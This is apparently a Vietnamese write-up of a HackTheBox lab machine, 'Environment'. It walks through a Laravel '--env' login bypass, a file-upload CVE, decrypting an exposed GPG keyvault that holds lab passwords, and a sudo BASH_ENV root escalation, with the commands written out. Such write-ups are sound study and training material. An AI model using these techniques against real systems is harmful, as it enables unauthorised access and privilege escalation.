# Environment

<img width="1483" height="538" alt="image" src="https://github.com/user-attachments/assets/216c99fd-80a1-4ffd-9b8f-e482b11c84df" />

Tôi dùng nmap thì tìm được 2 port là 22 và 80 với dịch vụ web có đường dẫn là `http://environment.htb`:

```
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp    open     http        nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Và đây là giao diện của website:

<img width="1911" height="987" alt="image" src="https://github.com/user-attachments/assets/370cce01-cc4c-4cb4-9cd3-8003f070d938" />

Tôi fuzz được 1 số đường dẫn và truy cập vào thử thì hiện ra version của website `PHP 8.2.28 — Laravel 11.30.0` :

<img width="1787" height="916" alt="image" src="https://github.com/user-attachments/assets/b10825fe-d103-40e1-ab3b-f2ff0f8e88c2" />

Và có CVE liên quan đến phiên bản này là [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301), lỗ hổng này liên quan đến tham số `--env`, kẻ tấn công có thể kiểm soát environment:

Có thể thấy khi tôi truyền thêm tham số vào thì ở trang web cũng hiện ra `http://environment.htb/?--env=namdt5125`:

<img width="1484" height="987" alt="image" src="https://github.com/user-attachments/assets/4aea65c8-a26a-4954-9bba-c43d24f31d98" />

Ở trang đăng nhập thì có các data POST là email, password, remember, tôi đoán kiểu dữ liệu sẽ là string, string và bool, tôi thử đổi giá trị của bool thành string để trigger ra để server leak ra code:

<img width="1853" height="1005" alt="image" src="https://github.com/user-attachments/assets/475e9d5a-72b0-4362-adbe-bbd8d980a728" />

Có thể thấy có đoạn `App::environment() == "preprod"` kiểm tra environment, lúc này tôi thêm `--env=preprod` vào đoạn login:

<img width="1856" height="1000" alt="image" src="https://github.com/user-attachments/assets/bf952725-7494-4cff-8392-d64ed1b97282" />

<img width="1917" height="1031" alt="image" src="https://github.com/user-attachments/assets/846db248-218b-44ce-9eb4-89a9570b85d5" />

Trang web không có gì ngoài tính năng upload file ra:

<img width="1909" height="1017" alt="image" src="https://github.com/user-attachments/assets/efcd7558-d0ec-473c-ac7c-17ac30240285" />

Tôi đã thử upload file ảnh với code php ở trong với mong đợi tìm được chỗ có include hoặc hàm tương tự nhưng không được 

Ở chức năng quản lý file của Laravel FileManager có lỗi liên quan đến validate tên của file là [CVE-2025-58440](https://github.com/ph-hitachi/CVE-2025-58440):

<img width="1902" height="1010" alt="image" src="https://github.com/user-attachments/assets/f313ead1-91bf-48e5-a84c-e6776b2436c6" />

<img width="1918" height="742" alt="image" src="https://github.com/user-attachments/assets/f4e81efe-9422-4e49-9fa6-416011c87261" />

File `keyvault.gpg` được mã hóa bằng công cụ GnuPG (GPG) và thư mục `.gnupg` thì lại được lộ ra ở đấy:

<img width="1016" height="447" alt="image" src="https://github.com/user-attachments/assets/000c1078-dd54-41a9-bfca-cb7a05722938" />

Tôi tải các file đó về máy để chuẩn bị cho việc crack:

<img width="925" height="401" alt="image" src="https://github.com/user-attachments/assets/00a01fa1-56bc-4a7e-8354-89a5f9d02582" />

Tôi dùng lệnh để crack:

```
$ export GNUPGHOME=/home/namdeptrai/road_to_hecker/lmao/.gnupg && gpg --decrypt /home/namdeptrai/road_to_hecker/lmao/keyvault.gpg > /home/namdeptrai/road_to_hecker/lmao/decrypted_keyvault
$ cat decrypted_keyvault 
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

Khi sử dụng lệnh `sudo -l` thì thấy file `/usr/bin/systeminfo` được chạy dưới quyền root và để ý thì có cả biến `BASH_ENV` đi kèm nữa, biến này sẽ thực thi khi `/usr/bin/systeminfo` được chạy dưới quyền root:

<img width="1410" height="605" alt="image" src="https://github.com/user-attachments/assets/f268b860-5198-4fb7-82a3-4ecc5287a6c9" />

```
echo "/bin/bash -p" > pwn.sh
chmod +x pwn.sh
export BASH_ENV=$(pwd)/pwn.sh
sudo /usr/bin/systeminfo
```

<img width="1331" height="327" alt="image" src="https://github.com/user-attachments/assets/c43c670d-5deb-4ea1-9365-f85be6302f73" />








